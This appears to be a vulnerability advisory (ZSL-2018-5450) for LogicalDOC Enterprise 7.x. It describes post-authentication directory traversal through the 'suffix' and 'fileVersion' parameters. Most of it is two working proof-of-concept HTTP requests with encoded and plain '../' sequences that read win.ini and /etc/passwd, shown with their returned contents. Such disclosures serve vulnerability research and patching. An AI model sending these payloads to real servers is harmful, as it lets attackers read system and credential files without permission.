@@ -1,0 +1,111 @@
+LogicalDOC Enterprise 7.7.4 Multiple Directory Traversal Vulnerabilities
+
+
+Vendor: LogicalDOC Srl
+Product web page: https://www.logicaldoc.com
+Affected version: 7.7.4
+                  7.7.3
+                  7.7.2
+                  7.7.1
+                  7.6.4
+                  7.6.2
+                  7.5.1
+                  7.4.2
+                  7.1.1
+
+Summary: LogicalDOC is a free document management system that is designed
+to handle and share documents within an organization. LogicalDOC is a content
+repository, with Lucene indexing, Activiti workflow, and a set of automatic
+import procedures.
+
+Desc: The application suffers from multiple post-auth file disclosure vulnerability
+when input passed thru the 'suffix' and 'fileVersion' parameters is not properly
+verified before being used to include files. This can be exploited to read arbitrary
+files from local resources with directory traversal attacks.
+
+Tested on: Microsoft Windows 10
+           Linux Ubuntu 16.04
+           Java 1.8.0_161
+           Apache-Coyote/1.1
+           Apache Tomcat/8.5.24
+           Apache Tomcat/8.5.13
+           Undisclosed 8.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5450
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5450.php
+
+
+26.01.2018
+
+---
+
+
+PoC #1:
+
+GET /thumbnail?docId=3375114&random=1517220341243&suffix=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1
+Host: localhost:8080
+
+
+Response:
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+[MCI Extensions.BAK]
+3g2=MPEGVideo
+3gp=MPEGVideo
+3gp2=MPEGVideo
+3gpp=MPEGVideo
+aac=MPEGVideo
+adt=MPEGVideo
+adts=MPEGVideo
+m2t=MPEGVideo
+m2ts=MPEGVideo
+m2v=MPEGVideo
+m4a=MPEGVideo
+m4v=MPEGVideo
+mod=MPEGVideo
+mov=MPEGVideo
+mp4=MPEGVideo
+mp4v=MPEGVideo
+mts=MPEGVideo
+ts=MPEGVideo
+tts=MPEGVideo
+
+
+
+PoC #2:
+
+GET /convertpdf?docId=2450&control=preview&fileVersion=../../../../../../etc/passwd HTTP/1.1
+Host: localhozt:8080
+
+
+Response:
+
+HTTP/1.1 200 
+Cache-Control: must-revalidate, post-check=0,pre-check=0
+Expires: 0
+Content-Disposition: attachment; filename="=?UTF-8?B?MDkyMDEyMzEwNTVTUFQgMDA0LnBkZi5wZGY=?="
+Pragma: public
+Content-Type: application/pdf;charset=UTF-8
+Content-Length: 964
+Date: Mon, 05 Feb 2018 21:30:59 GMT
+Connection: close
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:100:sync:/bin:/bin/sync
+games:x:5:100:games:/usr/games:/bin/sh
+...
+...
